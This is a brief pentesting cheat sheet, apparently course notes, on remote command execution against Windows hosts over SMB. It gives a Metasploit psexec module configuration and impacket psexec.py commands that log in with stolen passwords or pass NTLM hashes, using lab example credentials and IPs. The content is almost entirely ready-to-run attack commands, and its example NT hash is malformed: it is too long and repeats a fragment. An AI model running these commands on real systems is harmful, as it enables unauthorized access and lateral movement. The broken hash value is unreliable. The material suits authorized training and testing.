# Metasploit
```
Easy but noisy, do this for CTFs or certs.
use exploit/windows/smb/psexec
set RHOST $(IP_ADDRESS)
set SMBDomain $(DOMAIN) # e.g MARVEL.local
set SMBUser $(USERNAME)
set SMBPass $(PASSWORD) # The password can be the hash instead of the cracked password.
exploit
```
# psexec.py
Much less noisy. Do this in real-world engagements or certs where metasploit isn't allowed.
```bash
psexec.py $(DOMAIN)/$(USERNAME):'$(PASSWORD)'@$(IP_ADDRESS)
```
Example:
```bash
psexec.py MARVEL.local/fcastle:'Password1'@192.168.138.137
```
How to do it with a hash instead:
```bash
psexec.py $(USERNAME)@$(IP_ADDRESS) -hashes $(LM):$(NT)
```
Example:
```bash
psexec.py administrator@10.0.0.25 -hashes aad3b435b51404eeaad3b435b51404ee:6c598d4edc98d4edc98d0a0c9797ef98b869751
```
